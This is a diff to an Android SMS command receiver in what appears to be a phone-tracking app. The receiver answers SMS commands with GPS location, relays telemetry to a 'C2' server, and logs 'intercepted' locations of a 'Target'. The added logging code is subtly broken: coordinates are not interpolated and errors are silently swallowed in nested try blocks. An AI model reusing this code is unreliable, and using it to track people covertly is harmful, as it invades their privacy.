@@ -160,6 +160,12 @@ class SmsCommandReceiver : BroadcastReceiver() {
                                         relay_source = "SMS_RELAY"
                                     )
                                     val response = zexApi.relayTelemetry(relayPayload)
+                                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch { try { try {
+                                        zexApi.sendActivityLog(com.zex.tracker.data.remote.dto.ActivityLogPayload(
+                                            message = "Intercepted SMS location from Target targetUid. Location: lat, lng",
+                                            severity = "info"
+                                        ))
+                                    } catch(e: Exception) {} } catch(e: Exception) {} }
                                     if (response.isSuccessful) {
                                         ZexLogger.i("SmsCommandReceiver", "Successfully relayed telemetry to C2 via SMS_RELAY")
                                     } else {
@@ -331,6 +337,12 @@ class SmsCommandReceiver : BroadcastReceiver() {
                                     val deviceName = prefs.getString("device_name") ?: android.os.Build.MODEL
                                     val smsBody = "ZEX Alert [$deviceName] GPS: https://maps.google.com/?q=${lat},${lng} (Bat: ${batteryLevel}%)"
                                     sendReplySms(context, sender, smsBody)
+                                    kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch { try { try {
+                                        zexApi.sendActivityLog(com.zex.tracker.data.remote.dto.ActivityLogPayload(
+                                            message = "Sent GPS Coordinates to Commander via SMS: lat, lng",
+                                            severity = "info"
+                                        ))
+                                    } catch(e: Exception) {} } catch(e: Exception) {} }
                                     val deviceUid = prefs.getString("device_uid") ?: ""
                                     if (deviceUid.isNotEmpty()) {
                                         sendReplySms(context, sender, "#ZEX#LOC#$lat#$lng#$deviceUid")
@@ -360,6 +372,12 @@ class SmsCommandReceiver : BroadcastReceiver() {
                         screamManager.stopScream()
                         context.sendBroadcast(android.content.Intent("com.zex.tracker.DISARM"))
                         sendReplySms(context, sender, "ZEX: Device DISARMED successfully.")
+                        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch { try { try {
+                            zexApi.sendActivityLog(com.zex.tracker.data.remote.dto.ActivityLogPayload(
+                                message = "Disarmed Target via SMS",
+                                severity = "warning"
+                            ))
+                        } catch(e: Exception) {} } catch(e: Exception) {} }
                     }
                     else -> {
                         try {
@@ -381,5 +399,7 @@ class SmsCommandReceiver : BroadcastReceiver() {
         }
     }
 }
+
+
 
 
